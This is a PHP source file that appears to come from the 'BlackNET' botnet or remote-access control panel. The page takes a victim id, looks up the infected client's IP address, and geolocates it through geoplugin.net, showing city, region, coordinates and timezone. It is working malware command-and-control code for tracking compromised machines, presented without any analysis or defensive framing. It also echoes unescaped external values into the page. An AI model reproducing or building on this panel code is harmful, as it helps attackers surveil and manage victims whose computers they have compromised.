<?php
include_once 'session.php';
include_once 'classes/Clients.php';

$client = new Clients;
$ipaddress = $client->getClient($utils->sanitize($_GET['vicid']))->ipaddress;
$json = $utils->callAPI("GET", "http://www.geoplugin.net/json.gp?ip=" .
    $ipaddress, false);
$data = json_decode($json);
$allowed_keys = [
    'geoplugin_request' => "IP Address", 'geoplugin_city' => "City",
    'geoplugin_region' => "Region", 'geoplugin_countryName' => "Country",
    'geoplugin_continentName' => "Continent", 'geoplugin_latitude' => "latitude",
    'geoplugin_longitude' => "longitude", 'geoplugin_timezone' => "Timezone"];
$i
= 1;?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <?php include_once 'components/meta.php';?>
    <title>BlackNET - View Client Location</title>
    <?php include_once 'components/css.php';?>
    <link
      href="asset/vendor/datatables/dataTables.bootstrap4.css"
      rel="stylesheet"
    />
    <link
      href="asset/vendor/responsive/css/responsive.dataTables.css"
      rel="stylesheet"
    />
    <link
      href="asset/vendor/responsive/css/responsive.bootstrap4.css"
      rel="stylesheet"
    />
  </head>

  <body id="page-top">
    <?php include_once 'components/header.php';?>

    <div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">
          <ol class="breadcrumb">
            <li class="breadcrumb-item">
              <a href="#">View Client Location</a>
            </li>
          </ol>
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas fa-bolt"></i>
              Client Location
            </div>

            <div class="card-body">
              <div class="container container-special">
                <table
                  class="table table-bordered"
                  id="dataTable"
                  width="100%"
                  cellspacing="0"
                >
                  <thead>
                    <tr>
                      <th>#</th>
                      <th>Key</th>
                      <th>Value</th>
                    </tr>
                  </thead>
                  <tbody>
                    <?php foreach ($data as $key => $value): ?>
                    <?php if (key_exists($key, $allowed_keys)): ?>
                    <tr>
                      <td><?php echo $i; ?></td>
                      <td><?php echo $allowed_keys[$key]; ?></td>
                      <td><?php echo $value; ?></td>
                    </tr>
                    <?php $i++?>

                    <?php endif;?>
                    <?php endforeach;?>
                  </tbody>
                </table>
                <div>
                  <a href="https://whatismyipaddress.com/ip/<?php echo $ipaddress; ?>" class="btn btn-primary btn-block">View More Information</a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <?php include_once 'components/footer.php';?>

    <?php include_once 'components/js.php';?>
  </body>
</html>
